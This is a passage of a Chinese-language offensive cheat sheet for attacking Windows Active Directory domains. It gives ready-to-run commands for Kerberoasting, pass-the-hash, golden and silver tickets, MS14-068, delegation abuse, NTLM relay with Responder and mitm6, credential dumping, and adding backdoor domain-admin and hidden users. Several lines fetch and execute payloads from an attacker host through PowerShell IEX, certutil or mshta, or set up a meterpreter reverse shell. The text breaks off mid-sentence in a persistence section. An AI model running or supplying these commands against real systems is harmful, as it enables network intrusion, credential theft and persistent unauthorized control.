class=\"anchor\" href=\"#getuserspns\">#</a> GetUserSPNs</h2>\n<pre><code>https://github.com/SecureAuthCorp/impacket\n请求TGS\n&gt;python GetUserSPNs.py -request -dc-ip 10.1.1.1 zone.com/y\n破解\n&gt;hashcat -m 13100 -a 0 kerberos.txt wordlist.txt\n</code></pre>\n<h3 id=\"aseproasting\"><a class=\"anchor\" href=\"#aseproasting\">#</a> ASEPRoasting</h3>\n<pre><code>当用户关闭了kerberos预身份认证时可以进行攻击\n</code></pre>\n<p><img data-src=\"378.png\" alt=\"\" /></p>\n<pre><code>&gt;Rubeus.exe asreproast /user:y /dc:10.1.1.100 /domain:zone.com\n</code></pre>\n<p><img data-src=\"379.png\" alt=\"\" /></p>\n<pre><code>或使用Powerview结合https://github.com/gold1029/ASREPRoast\n获取不要求kerberos预身份验证的域内用户\n&gt;Get-DomainUser -PreauthNotRequired -Properties distinguishedname –Verbose\n</code></pre>\n<p><img data-src=\"380.png\" alt=\"\" /></p>\n<pre><code>&gt;Get-ASREPHash -UserName y -Domain zone.com -Verbose\n</code></pre>\n<p><img data-src=\"381.png\" alt=\"\" /></p>\n<pre><code>破解RC4-HMAC AS-REP\n&gt;john hash.txt --wordlist=wordlist.txt\n</code></pre>\n<p><img data-src=\"382.png\" alt=\"\" /></p>\n<h3 id=\"pass-the-hash\"><a class=\"anchor\" href=\"#pass-the-hash\">#</a> PASS-THE-HASH</h3>\n<pre><code>允许本地管理组所有成员连接\n&gt;reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f  \n</code></pre>\n<h2 id=\"-565\"><a class=\"anchor\" href=\"#-565\">#</a> </h2>\n<h2 id=\"wmiexec-thehash\"><a class=\"anchor\" href=\"#wmiexec-thehash\">#</a> WMIExec &amp; TheHash</h2>\n<pre><code>&gt;powershell -ep bypass\n&gt;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Invoke-TheHash/Invoke-WMIExec.ps1'); \n&gt;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Invoke-TheHash/Invoke-TheHash.ps1');\n&gt;Invoke-TheHash -Type WMIExec -Target 192.168.0.0/24 -Domain zone.com -Username godadmin -Hash f1axxxxxxxxxb771\n</code></pre>\n<p><img data-src=\"383.png\" alt=\"\" /></p>\n<h2 id=\"-566\"><a class=\"anchor\" href=\"#-566\">#</a> </h2>\n<h2 id=\"wmi-3\"><a class=\"anchor\" href=\"#wmi-3\">#</a> WMI</h2>\n<pre><code>&gt;net use \\\\1.1.1.1\\admin$ /user:&quot;administrator&quot; &quot;password&quot;\n&gt;copy windowsupdate.exe \\\\1.1.1.1\\admin$\\dir\\\n&gt;wmic /NODE:&quot;1.1.1.1&quot; /user:&quot;administrator&quot; /password:&quot;password&quot; PROCESS call create &quot;c:\\windows\\dir\\windowsupdate.exe&quot; \n&gt;del \\\\1.1.1.1\\admin$\\dir\\windowsupdate.exe /F \n&gt;net use \\\\1.1.1.1\\admin$ /del\n</code></pre>\n<h2 id=\"-567\"><a class=\"anchor\" href=\"#-567\">#</a> </h2>\n<h3 id=\"wmiexecpy\"><a class=\"anchor\" href=\"#wmiexecpy\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovL3dtaWV4ZWMucHk=\">wmiexec.py</span></h3>\n<pre><code>https://github.com/SecureAuthCorp/impacket \n&gt;python wmiexec.py -hashes AAD3B435B51404EEAAD3B435B51404EE:A812E6C2DEFCB0A7B80868F9F3C88D09 域名/Administrator@192.168.11.1 &quot;whoami&quot;\n&gt;python wmiexec.py admin@192.168.1.2\n</code></pre>\n<p><img data-src=\"384.png\" alt=\"\" /></p>\n<h2 id=\"-568\"><a class=\"anchor\" href=\"#-568\">#</a> </h2>\n<h3 id=\"wmiexecvbs\"><a class=\"anchor\" href=\"#wmiexecvbs\">#</a> wmiexec.vbs</h3>\n<pre><code>半交互式：\n&gt;cscript //nologo wmiexec.vbs /shell 192.168.1.2 admin pass\n单条命令\n&gt;cscript //nologo wmiexec.vbs /cmd 192.168.1.2 domain\\admin pass &quot;whoami&quot;\n下载执行\n&gt;wmic /node:192.168.0.115 /user:godadmin /password:password PROCESS call create &quot;cmd /c certutil.exe -urlcache -split -f http://192.168.0.107/clickme.exe c:/windows/temp/win.exe &amp; c:/windows/temp/win.exe &amp; certutil.exe -urlcache -split -f http://192.168.0.107/clickme.exe delete&quot;\n</code></pre>\n<p><img data-src=\"385.png\" alt=\"\" /></p>\n<h2 id=\"-569\"><a class=\"anchor\" href=\"#-569\">#</a> </h2>\n<h3 id=\"powershell-7\"><a class=\"anchor\" href=\"#powershell-7\">#</a> Powershell</h3>\n<pre><code>&gt;wmic /NODE:192.168.3.108 /user:&quot;godadmin&quot; /password:&quot;password&quot; PROCESS call create &quot;powershell -nop -exec bypass -c \\&quot;IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.107/xxx.txt');\\&quot;&quot;\nInvoke-WMIExec\n&gt;powershell -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Invoke-WMIExec.ps1');Invoke-WMIExec -Target 192.168.0.115 -Domain Workgroup -Username godadmin -Hash f1a5b1a3641bec99ff92fe9df700b771 -Command \\&quot;net user admin Qwe@123 /add\\&quot; -Verbose&quot;\n</code></pre>\n<p><img data-src=\"386.png\" alt=\"\" /></p>\n<pre><code>&gt;powershell -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/Invoke-WMIExec.ps1');Invoke-WMIExec -Target 192.168.0.115 -Domain Workgroup -Username godadmin -Hash f1xxxxxxxxxxxxx771 -Command \\&quot;mshta http://192.168.0.107:8080/YAyAPN6odzbAzKn.hta\\&quot; -Verbose&quot;\n</code></pre>\n<p><img data-src=\"387.png\" alt=\"\" /></p>\n<h2 id=\"-570\"><a class=\"anchor\" href=\"#-570\">#</a> </h2>\n<h2 id=\"psexec\"><a class=\"anchor\" href=\"#psexec\">#</a> Psexec</h2>\n<pre><code>&gt;psexec.exe -hashes AAD3B435B51404EEAAD3B435B51404EE:A812E6C2DEFCB0A7B80868F9F3C88D09域名/Administrator@192.168.1.1 &quot;whoami&quot;\n&gt;psexec.exe –accepteula \\\\192.168.1.2 –u admin –p pass cmd.exe 无确认窗\nMsf\n#use exploit/windows/smb/psexec\n#use exploit/windows/smb/psexec_psh(powershell版本)\n</code></pre>\n<h2 id=\"-571\"><a class=\"anchor\" href=\"#-571\">#</a> </h2>\n<h2 id=\"mimikatz-3\"><a class=\"anchor\" href=\"#mimikatz-3\">#</a> Mimikatz</h2>\n<pre><code>Windows XP、Vista、2008、7、2008 r2 和2012没有安装KB2871997补丁的机器上，使用NTLM进行PTH\nmimikatz # privilege::debug\nmimikatz # sekurlsa::pth /user:admin /domain:xxx.com /ntlm:&#123;ntlm&#125;\n执行一个文件\nmimikatz # sekurlsa::pth /user:admin /domain:xxx.com /ntlm:&#123;ntlm&#125; /run:powershell.exe\nWindows 8.1 、2012 R2、安装KB2871997的Win 7 、2008 R2和2012上可使用AES KEY进行PTH\n&gt;privilege::debug\n&gt;sekurlsa::ekeys\n&gt;sekurlsa::pth /user:administrator /domain:zone.com /aes128:&#123;key&#125;\n</code></pre>\n<h2 id=\"-572\"><a class=\"anchor\" href=\"#-572\">#</a> </h2>\n<h2 id=\"pth-winexe\"><a class=\"anchor\" href=\"#pth-winexe\">#</a> pth-winexe</h2>\n<pre><code>&gt;pth-winexe -U godadmin%password --system --ostype=1 //192.168.0.115 cmd\n</code></pre>\n<p><img data-src=\"388.png\" alt=\"\" /></p>\n<h2 id=\"-573\"><a class=\"anchor\" href=\"#-573\">#</a> </h2>\n<h2 id=\"smbexec\"><a class=\"anchor\" href=\"#smbexec\">#</a> Smbexec</h2>\n<pre><code>&gt;python smbexec.py administrator@192.168.0.98\n</code></pre>\n<p><img data-src=\"389.png\" alt=\"\" /></p>\n<h3 id=\"pass-the-ticket\"><a class=\"anchor\" href=\"#pass-the-ticket\">#</a> PASS-THE-TICKET</h3>\n<h2 id=\"-574\"><a class=\"anchor\" href=\"#-574\">#</a> </h2>\n<h2 id=\"名词\"><a class=\"anchor\" href=\"#名词\">#</a> 名词</h2>\n<pre><code>KDC(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS和TGS\nAS(Authentication Server)： 身份认证服务\nTGS(Ticket Granting Server)： 票据授予服务\nTGT(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为10小时\n</code></pre>\n<h2 id=\"-575\"><a class=\"anchor\" href=\"#-575\">#</a> </h2>\n<h2 id=\"黄金票据mimikatz\"><a class=\"anchor\" href=\"#黄金票据mimikatz\">#</a> 黄金票据 + Mimikatz</h2>\n<pre><code>Golden Ticket伪造TGT(Ticket Granting Ticket)，可以获取任何Kerberos服务权限，\n域控中提取krbtgt的hash\n域控：dc.zone.com\n域内机器：sub2k8.zone.com\n域内普通用户：y\n域内机器是不能访问dc上的文件\n</code></pre>\n<p><img data-src=\"390.png\" alt=\"\" /></p>\n<pre><code>清空票据\n</code></pre>\n<p><img data-src=\"391.png\" alt=\"\" /></p>\n<pre><code>域控中获取krbtgt用户的信息\n&gt;privilege::debug\n&gt;mimikatz log &quot;lsadump::dcsync /domain:zone.com /user:krbtgt&quot;\n获取信息：/domain、/sid、/aes256\n</code></pre>\n<p><img data-src=\"392.png\" alt=\"\" /></p>\n<pre><code>在sub2k8中生成golden ticket\n&gt;mimikatz “kerberos::golden /krbtgt:&#123;ntlmhash&#125; /admin:域管理 /domain:域名 /sid:sid /ticket:gold.kirbi”\n</code></pre>\n<p><img data-src=\"393.png\" alt=\"\" /></p>\n<pre><code>导入\nMimikatz#kerberos::ptt 123.kirbi\n</code></pre>\n<p><img data-src=\"394.png\" alt=\"\" /></p>\n<h2 id=\"-576\"><a class=\"anchor\" href=\"#-576\">#</a> </h2>\n<h2 id=\"白银票据mimikatz\"><a class=\"anchor\" href=\"#白银票据mimikatz\">#</a> 白银票据 + Mimikatz</h2>\n<p><img data-src=\"395.png\" alt=\"\" /></p>\n<pre><code>Silver Ticket是伪造的TGS，只能访问指定服务权限\n域控：dc.zone.com\n域内机器：sub2k8.zone.com\n域内普通用户：y\n域控中导出\n&gt;privilege::debug\n&gt;sekurlsa::logonpasswords\n</code></pre>\n<p><img data-src=\"396.png\" alt=\"\" /></p>\n<pre><code>Sub2k8伪造票据\n&gt;mimikatz &quot;kerberos::golden /domain:zone.com /sid:&#123;SID&#125; /target:dc.zone.com /service:cifs /rc4:&#123;NTLM&#125; /user:y /ptt&quot;\n</code></pre>\n<p><img data-src=\"397.png\" alt=\"\" /></p>\n<h2 id=\"-577\"><a class=\"anchor\" href=\"#-577\">#</a> </h2>\n<h2 id=\"ms14-068\"><a class=\"anchor\" href=\"#ms14-068\">#</a> MS14-068</h2>\n<pre><code>https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068\nhttps://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe\n域控：dc.zone.com/10.1.1.100\n域内机器：sub2k8.zone.com/10.1.1.98\n域内普通用户：y，\nSub2k8中清除票据\nMimikatz#kerberos::purge\n&gt;whoami /user查看SID \n创建ccache票据文件\n&gt; MS14-068.exe -u y@zone.com -p password -s S-1-5-21-2346829310-1781191092-2540298887-1112 -d dc.zone.com\n注入票据\nMimikatz# Kerberos::ptc c:\\xx\\xx\\xxx.ccache\npsexec无密码登陆\n&gt;PsExec.exe \\\\dc.xx.com\\ cmd.exe\n</code></pre>\n<h2 id=\"-578\"><a class=\"anchor\" href=\"#-578\">#</a> </h2>\n<h2 id=\"mimikatzmsf\"><a class=\"anchor\" href=\"#mimikatzmsf\">#</a> Mimikatz+MSF</h2>\n<pre><code>&gt;whoami /user 查看SID\nmsf &gt;use auxiliary/admin/kerberos/ms14_068_kerberos_checksum\nmsf &gt;set domain 域名\nmsf &gt;set password 密码\nmsf &gt;set rhost 域控机器\nmsf &gt;set user 用户\nmsf &gt;set user_sid sid\n得到.bin文件\n#apt-get install krb5-user\n上传mimikatz和bin文件\nMimikatz# Kerberos::clist “xxxx.bin” /export\n生成kirbi文件\nMeterpreter &gt;load kiwi\nMeterpreter &gt;download c:/wmpub/xxxxxx.kirbi /tmp/\n注入票据\nMeterpreter &gt;kerberos_ticket_use /tmp/xxxxxx.kirbi\n#use exploit/windows/local/current_user_psexec\n#set TECHNIQUE PSH\n#set RHOST dc.xx.com\n#set payload windows/meterpreter/reverse_tcp\n#set LHOST 192.168.1.1\n#set session 1\n#exploit\n</code></pre>\n<h2 id=\"-579\"><a class=\"anchor\" href=\"#-579\">#</a> </h2>\n<h2 id=\"goldenpacpy\"><a class=\"anchor\" href=\"#goldenpacpy\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovL2dvbGRlblBhYy5weQ==\">goldenPac.py</span></h2>\n<pre><code>kali下\n#apt-get install krb5-user\n#goldenPac.py –dc-ip 10.1.1.100 –target-ip 10.1.1.100 zone.com/y:password@dc.zone.com\n</code></pre>\n<h3 id=\"账户委派\"><a class=\"anchor\" href=\"#账户委派\">#</a> 账户委派</h3>\n<h2 id=\"-580\"><a class=\"anchor\" href=\"#-580\">#</a> </h2>\n<h2 id=\"账户非受限委派\"><a class=\"anchor\" href=\"#账户非受限委派\">#</a> 账户非受限委派</h2>\n<pre><code>设置用户y为服务账户(服务账户有委派权限)\n&gt;setspn -U -A variant/golden y\n</code></pre>\n<p><img data-src=\"398.png\" alt=\"\" /></p>\n<pre><code>查询非受限委派域内账号，使用powerview\n&gt;Get-NetUser -Unconstrained -Domain zone.com\n</code></pre>\n<p><img data-src=\"399.png\" alt=\"\" /></p>\n<pre><code>利用\n管理员权限打开mimikatz导出TGT\n&gt;privilege::debug\n&gt;sekurlsa::tickets /export\n</code></pre>\n<p><img data-src=\"400.png\" alt=\"\" /></p>\n<pre><code>清空票据，导入票据\n</code></pre>\n<p><img data-src=\"401.png\" alt=\"\" /><br />\n<img data-src=\"402.png\" alt=\"\" /></p>\n<pre><code>获得Powershell会话\n&gt; Enter-PSSession -ComputerName dc.zone.com\n</code></pre>\n<p><img data-src=\"403.png\" alt=\"\" /></p>\n<h2 id=\"-581\"><a class=\"anchor\" href=\"#-581\">#</a> </h2>\n<h2 id=\"账户受限委派\"><a class=\"anchor\" href=\"#账户受限委派\">#</a> 账户受限委派</h2>\n<pre><code>查询受限委派用户\n&gt; Get-DomainUser -TrustedToAuth –Domain zone.com\n</code></pre>\n<p><img data-src=\"404.png\" alt=\"\" /></p>\n<pre><code>查询受限委派主机\n&gt; Get-DomainComputer -TrustedToAuth -Domain zone.com\n</code></pre>\n<p><img data-src=\"405.png\" alt=\"\" /></p>\n<pre><code>利用方法后见权限维持模块\n</code></pre>\n<h3 id=\"资源受限委派\"><a class=\"anchor\" href=\"#资源受限委派\">#</a> 资源受限委派</h3>\n<pre><code>获取域管理员\n&gt;Get-DomainUser|select -First 1\n域对象信息\n&gt;Get-DomainObject -Identity 'DC=zone,DC=com'\nms-ds-machineaccountquota允许非特权用户将最多 10 台计算机连接到域\n</code></pre>\n<p><img data-src=\"406.png\" alt=\"\" /></p>\n<pre><code>查看有没有设置msDS-AllowedToActOnBehalfOfOtherIdentity策略\n&gt;Get-DomainComputer dc|select name, msDS-AllowedToActOnBehalfOfOtherIdentity\n</code></pre>\n<p><img data-src=\"407.png\" alt=\"\" /></p>\n<pre><code>用powermad添加一具备SPN的机器账户\nhttps://github.com/Kevin-Robertson/Powermad\n&gt;New-MachineAccount -MachineAccount newcom\n</code></pre>\n<p><img data-src=\"408.png\" alt=\"\" /></p>\n<pre><code>或\n&gt;$pass = ConvertTo-SecureString '123qwe!@#' -AsPlainText –Force\n&gt;New-MachineAccount –MachineAccount newcom -Password $pass\n或\n&gt;New-MachineAccount -MachineAccount newcom -Password $(ConvertTo-SecureString '123qwe!@#' -AsPlainText -Force)\n</code></pre>\n<p><img data-src=\"409.png\" alt=\"\" /></p>\n<pre><code>获取添加的机器账户的SID\n</code></pre>\n<p><img data-src=\"410.png\" alt=\"\" /></p>\n<pre><code>将添加的机器账户的SID设置给DC的msDS-AllowedToActOnBehalfOfOtherIdentity参数\n&gt;$SD=New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2346829310-1781191092-2540298887-1122)&quot;; $SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer dc | Set-DomainObject -Set @&#123;'msds-allowedtoactonbehalfofotheridentity'=$SDBytes&#125;\n设置完成后查看\n</code></pre>\n<p><img data-src=\"411.png\" alt=\"\" /></p>\n<pre><code>配置ACL允许访问\n&gt;$RawBytes=Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity' |select -expand msds-allowedtoactonbehalfofotheridentity;$Descriptor= New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes,0;$Descriptor.DiscretionaryAcl\n</code></pre>\n<p><img data-src=\"412.png\" alt=\"\" /></p>\n<pre><code>此时使用创建的机器账户的hash可伪造域管\n先获取newcom的NTLM\n&gt;Rubeus.exe hash /password:123qwe!@# /user:newcom /domain:zone.com\n</code></pre>\n<p><img data-src=\"413.png\" alt=\"\" /></p>\n<pre><code>导入票据伪造域管用户访问cifs服务\n&gt;Rubeus.exe s4u /user:newcom$ /rc4:00AFFD88FA323B00D4560B F9FEF0EC2F /impersonateuser:godadmin /msdsspn:cifs/dc.zone.com /ptt\n</code></pre>\n<p><img data-src=\"414.png\" alt=\"\" /></p>\n<pre><code>成功获取到godadmin的tgs\n</code></pre>\n<p><img data-src=\"415.png\" alt=\"\" /><br />\n<img data-src=\"416.png\" alt=\"\" /><br />\n<img data-src=\"417.png\" alt=\"\" /></p>\n<h3 id=\"cve-2019-0708\"><a class=\"anchor\" href=\"#cve-2019-0708\">#</a> CVE-2019-0708</h3>\n<pre><code>&gt;python ntlmrelayx.py -t ldaps://dc.zone.com --remove-mic --delegate-access -smb2support\n&gt;python printerbug.py zone.com/y@win7.zone.com 192.168.0.attack\n&gt;python getST.py -spn host/win7.zone.com 'zone.com/机器账户$:密码' -impersionate administrator -dc-ip 192.168.0.1\n&gt;export KRB5CCNAME=XX.ccahe\n&gt;python secretdump.py -k -no-pass dc.zone.com -just-dc\n</code></pre>\n<h3 id=\"ntlm中继\"><a class=\"anchor\" href=\"#ntlm中继\">#</a> NTLM 中继</h3>\n<h2 id=\"-582\"><a class=\"anchor\" href=\"#-582\">#</a> </h2>\n<h2 id=\"ntlmrelayx资源受限委派\"><a class=\"anchor\" href=\"#ntlmrelayx资源受限委派\">#</a> Ntlmrelayx + 资源受限委派</h2>\n<pre><code>域控需启用ldaps，域机器启用ipv6\n*当执行ntlmrelayx脚本时，遇到报错\n</code></pre>\n<p><img data-src=\"418.png\" alt=\"\" /></p>\n<pre><code>修改\nimpacket/impacket/examples/ntlmrelayx/attacks/ldapattack.py ldapattack.py脚本，在510行上方加入\nif self.config.interactive: \n</code></pre>\n<p><img data-src=\"419.png\" alt=\"\" /></p>\n<pre><code>再重新安装&gt;python setup.py install\n使用mitm6通过ipv6接管dns服务器，配置好后开始请求网络的WPAD\n&gt;mitm6 -i eth1 -d zone.com\n</code></pre>\n<p><img data-src=\"420.png\" alt=\"\" /></p>\n<pre><code>使用ntlmreplyx.py监听\n&gt;python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --add-computer\n当目标重启网络、访问浏览器、重启电脑时会把攻击机视为代理服务器，当目标通过攻击机代理服务器访问网络时，攻击机将会向目标发送代理的认证请求，并中继NTLM认证到LDAP服务器上，完成攻击。\n这里要使用ldaps，因为域控会拒绝在不安全的连接中创建账户。\n</code></pre>\n<p><img data-src=\"421.png\" alt=\"\" /></p>\n<pre><code>可以看到已经成功添加了一个机器账户RFAYOVCC密码6YdX.NXqQGyuR7[\n使用此机器账户申请票据\n&gt;python getST.py -spn cifs/sub2k8.zone.com zone.com/RFAYOVCC\\$ -impersonate y\n</code></pre>\n<p><img data-src=\"422.png\" alt=\"\" /></p>\n<pre><code>&gt;export KRB5CCNAME=y.ccache\n获取shell\n&gt;python smbexec.py -no-pass -k sub2k8.zone.com\n</code></pre>\n<p><img data-src=\"423.png\" alt=\"\" /></p>\n<pre><code>dumphash、缓存hash\n&gt;python secretsdump.py -k -no-pass sub2k8.zone.com\n</code></pre>\n<p><img data-src=\"424.png\" alt=\"\" /></p>\n<pre><code>当域控机器未启用LDAPS，并且已获得域普通用户权限时\n使用powermad创建一个机器账户newcom\nhttps://github.com/Kevin-Robertson/Powermad\n&gt;New-MachineAccount -MachineAccount newcom -Password $(ConvertTo-SecureString '123qwe!@#' -AsPlainText -Force)\n</code></pre>\n<p><img data-src=\"425.png\" alt=\"\" /></p>\n<pre><code>或\n</code></pre>\n<p><img data-src=\"426.png\" alt=\"\" /><br />\n<img data-src=\"427.png\" alt=\"\" /></p>\n<pre><code>&gt;python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --escalate-user newcom\\$\n</code></pre>\n<p><img data-src=\"428.png\" alt=\"\" /></p>\n<pre><code>后续正常操作即可。\n内网存在java webdav时PROPPATCH、PROPFIND、 LOCK等请求方法接受XML作为输入时会形成xxe。攻击者要求采用NTLM认证方式是，webdav会自动使用当前用户的凭据认证。\n使用ntlmrelayx监听\n&gt;python ntlmrelayx.py -t ldaps://dc.zone.com -debug -ip 10.1.1.101 --delegate-access --escalate-user newcom\\$\nBurp发送xxe请求\nPROPFIND /webdav HTTP/1.1\nHost: 1.1.1.1\n\n&lt;?xml version&quot;1.0&quot; encoding=&quot;UFT-8&quot;?&gt;\n&lt;!DOCTYPE xxe [\n&lt;!ENTITY loot SYSTEM &quot;http://10.1.1.101&quot;&gt; ]&gt;\n&lt;D:xxe xmln:D=&quot;DAV:&quot;&gt;&lt;D:set&gt;&lt;D:prop&gt;\n&lt;a xmlns=&quot;http://xx.e&quot;&gt;&amp;loot;&lt;/a&gt;\n&lt;/D:prop&gt;&lt;/D:set&gt;&lt;/D:xxe&gt;\n</code></pre>\n<h2 id=\"-583\"><a class=\"anchor\" href=\"#-583\">#</a> </h2>\n<h2 id=\"responder\"><a class=\"anchor\" href=\"#responder\">#</a> Responder</h2>\n<h2 id=\"-584\"><a class=\"anchor\" href=\"#-584\">#</a> </h2>\n<h3 id=\"smb协议截获\"><a class=\"anchor\" href=\"#smb协议截获\">#</a> SMB 协议截获</h3>\n<pre><code>内网中间人攻击脚本，kali内置\n监听网络接口\n&gt;responder -I wlan0(eth0)\n指定某台机器或网段：修改/etc/responder/Responder.py中RespondTo参数。\n网段中有认证行为会捕获NTLMv2 hash\n</code></pre>\n<p><img data-src=\"429.png\" alt=\"\" /></p>\n<pre><code>当访问一个不存在的共享时修改配置文件来解析\nXp\n修改/usr/share/responder/servers/SMB.py定位到errorcode修改为\\x71\\x00\\x00\\xc0，删除掉/usr/share/responder/Responder.db\n</code></pre>\n<p><img data-src=\"430.png\" alt=\"\" /></p>\n<pre><code>XP时使用\\\\cmd\\share形式访问共享输入密码达4次会断开连接。\n定位到\n</code></pre>\n<p><img data-src=\"431.png\" alt=\"\" /></p>\n<pre><code>修改self.ntry != 10\nWin7以上\n修改/usr/share/responder/servers/SMB.py定位到\n</code></pre>\n<p>##Session Setup 3</p>\n<p><img data-src=\"432.png\" alt=\"\" /></p>\n<pre><code>删除掉and GrabMessageID(data)[0:1] == &quot;\\x02&quot;，删除掉/usr/share/responder/Responder.db\n修改后可以进行解析，捕获hash，否则会报错误64\n</code></pre>\n<p><img data-src=\"433.png\" alt=\"\" /></p>\n<pre><code>强制截取NTLMv1 hash，修改/usr/share/responder/packets.py，定位到以下参数，修改为\\x15\\x82\\x81\\xe2，修改Conf文件设置Challenge为16位固定值。\n</code></pre>\n<p><img data-src=\"434.png\" alt=\"\" /><br />\n<img data-src=\"435.png\" alt=\"\" /><br />\n<img data-src=\"436.png\" alt=\"\" /></p>\n<h2 id=\"-585\"><a class=\"anchor\" href=\"#-585\">#</a> </h2>\n<h3 id=\"wpad代理欺骗\"><a class=\"anchor\" href=\"#wpad代理欺骗\">#</a> WPAD 代理欺骗</h3>\n<pre><code>&gt;responder -I eth0 -v -F \nF参数即可开启强制WPAD认证服务抓取 hash，访问IE或重启电脑即可发送欺骗认证获得hash。\n</code></pre>\n<p><img data-src=\"437.png\" alt=\"\" /><br />\n<img data-src=\"438.png\" alt=\"\" /></p>\n<pre><code>重启也可以抓到\n</code></pre>\n<p><img data-src=\"439.png\" alt=\"\" /></p>\n<h2 id=\"-586\"><a class=\"anchor\" href=\"#-586\">#</a> </h2>\n<h3 id=\"web漏洞\"><a class=\"anchor\" href=\"#web漏洞\">#</a> Web 漏洞</h3>\n<pre><code>内网中使用文件包含漏洞和XSS\n&gt;Responder -I eth0 -v\nhttp://10.1.1.1/file.php?file=\\\\10.1.1.12\\share\nhttp://10.1.1.1/xss.php?article=&lt;img src=\\\\10.1.1.12\\xx&gt;\n</code></pre>\n<h2 id=\"-587\"><a class=\"anchor\" href=\"#-587\">#</a> </h2>\n<h3 id=\"中继攻击\"><a class=\"anchor\" href=\"#中继攻击\">#</a> 中继攻击</h3>\n<pre><code>修改/etc/responder/Responder.conf文件，配置smb和http为Off，分别开启两个对话框，使用F参数启用WPAD欺骗浏览器，使用/usr/share/responder/tools中的MultiReplay.py进行中继攻击获得目标cmdshell。\n&gt;Responder -I eth0 -v -F\n&gt;python MultiReplay.py -t 192.168.0.115 -u ALL\n</code></pre>\n<p><img data-src=\"440.png\" alt=\"\" /><br />\n<img data-src=\"441.png\" alt=\"\" /></p>\n<h2 id=\"-588\"><a class=\"anchor\" href=\"#-588\">#</a> </h2>\n<h3 id=\"ntlmv2hash破解\"><a class=\"anchor\" href=\"#ntlmv2hash破解\">#</a> NTLMv2Hash 破解</h3>\n<pre><code>使用hashcat破解 -m 5600为NTLMv2类型\n&gt;hashcat -m 5600 pass.txt wordlists.txt\n</code></pre>\n<p><img data-src=\"442.png\" alt=\"\" /></p>\n<h3 id=\"gpp-password\"><a class=\"anchor\" href=\"#gpp-password\">#</a> GPP-Password</h3>\n<pre><code>域内机器可访问\\\\zone.com\\SYSVOL\\zone.com共享文件夹，翻看策略文件，查找groups.xml，ScheduledTasks\\ScheduledTasks.xml，Printers\\Printers.xml，Drives\\Drives.xml，DataSources\\DataSources.xml， Services\\Services.xml等文件\n</code></pre>\n<p><img data-src=\"443.png\" alt=\"\" /></p>\n<pre><code>使用powersploit脚本解密\n</code></pre>\n<p><img data-src=\"444.png\" alt=\"\" /></p>\n<pre><code>使用msf的auxiliary/scanner/smb/smb_enum_gpp模块\n</code></pre>\n<p><img data-src=\"445.png\" alt=\"\" /></p>\n<h3 id=\"winrm无文件执行\"><a class=\"anchor\" href=\"#winrm无文件执行\">#</a> WinRM 无文件执行</h3>\n<pre><code>&gt;winrm quickconfig –q启动winrm\n或PS&gt;Enable-PSRemoting -Force\n生成木马并启动监听\n</code></pre>\n<p><img data-src=\"446.png\" alt=\"\" /><br />\n<img data-src=\"447.png\" alt=\"\" /></p>\n<pre><code>放入已获得权限的机器C盘中\n内网另外机器中执行\n&gt;net use \\\\192.168.0.115\\c$\n&gt;winrm invoke create wmicimv2/win32_process @&#123;commandline=&quot;\\\\192.168.0.115\\c\\index.exe&quot;&#125;\n</code></pre>\n<h3 id=\"添加域管命令\"><a class=\"anchor\" href=\"#添加域管命令\">#</a> 添加域管命令</h3>\n<pre><code>&gt;net user admin$ pass@123 /add /doamin\n&gt;net group &quot;Domain admins&quot; admin$ /add /domain\n</code></pre>\n<h3 id=\"ssh密钥免密登录\"><a class=\"anchor\" href=\"#ssh密钥免密登录\">#</a> SSH 密钥免密登录</h3>\n<pre><code>&gt;ssh -i id_rsa user@192.168.0.110\n</code></pre>\n<h3 id=\"获取保存的rdp密码\"><a class=\"anchor\" href=\"#获取保存的rdp密码\">#</a> 获取保存的 RDP 密码</h3>\n<pre><code>位置\nC:\\Users\\用户名\\AppData\\Local\\Microsoft\\Credentials\n查看命令\n&gt;cmdkey /list\n&gt;mimikatz log\n#dpapi::cred /in:C:\\Users\\administrator\\AppData\\Local\\Microsoft\\Credentials\\D53BF8DC4D52D75463D46595907A4015\n记录guidMasterKey: &#123;572115f2-80b1-4b1e-be1b-425f5c7a8bfd&#125;\n#privilege::debug\n#sekurlsa::dpapi\n找到GUID为guidMasterKey的值下面的MasterKey: d928f5e02d2e9495f92bb…\n#dpapi::cred /in:C:\\Users\\administrator\\AppData\\Local\\Microsoft\\Credentials\\D53BF8DC4D52D75463D46595907A4015 /masterkey: d928f5e02d2e9495f92bb…\n密码为CredentialBlob值。\n</code></pre>\n<h2 id=\"后门持久化-2\"><a class=\"anchor\" href=\"#后门持久化-2\">#</a> 后门 &amp; 持久化</h2>\n<h3 id=\"影子用户\"><a class=\"anchor\" href=\"#影子用户\">#</a> 影子用户</h3>\n<pre><code>&gt;net user test$ test /add\n&gt;net localgroup administrators test$ /add\n注册表HKEY_LOCAL_MACHINE\\SAM\\SAM\\\n给予administrator 